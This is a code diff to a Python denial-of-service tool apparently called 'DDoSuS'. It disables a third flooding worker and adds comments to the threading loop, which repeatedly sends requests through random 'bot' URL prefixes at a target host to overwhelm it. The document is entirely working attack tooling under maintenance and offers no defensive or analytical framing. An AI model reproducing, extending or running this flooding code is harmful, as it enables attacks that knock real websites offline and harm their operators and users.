@@ -97,11 +97,11 @@ def dos2():
 		bot_rippering(random.choice(bots)+"http://"+host)
 		w.task_done()
 
-def dos3():
-     while True:
-        item = e.get()
-        bot_rippering(random.choice(bots)+"http://"+host)
-        e.task_done()
+#def dos3():
+ #    while True:
+ #       item = e.get()
+ #       bot_rippering(random.choice(bots)+"http://"+host)
+ #       e.task_done()
 
 def usage():
 	print (''' \033[0;95mDDoSuS
@@ -144,12 +144,13 @@ def get_parameters():
 	else:
 		thr = opts.turbo
 
+# reading headers
 global data
 headers = open("headers.txt", "r")
 data = headers.read()
 headers.close()
 
-
+#task queue are q,w,e
 q = Queue()
 w = Queue()
 e = Queue()
@@ -173,19 +174,19 @@ if __name__ == '__main__':
 	while True:
 		for i in range(int(thr)):
 			t = threading.Thread(target=dos)
-			t.daemon = True  
+			t.daemon = True  # if thread is exist, it dies
 			t.start()
 			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  
+			t2.daemon = True  # if thread is exist, it dies
 			t2.start()
-			t3 = threading/Thread(target=dos3)
-			t3.daemon = True 
-			t3.start()
+		#	t3 = threading/Thread(target=dos3)
+		#	t3.daemon = True # if thread is exist, it dies
+		#	t3.start()
 		start = time.time()
-
+		#tasking
 		item = 0
 		while True:
-			if (item>1800):
+			if (item>1800): # for no memory crash
 				item=0
 				time.sleep(.1)
 			item = item + 1
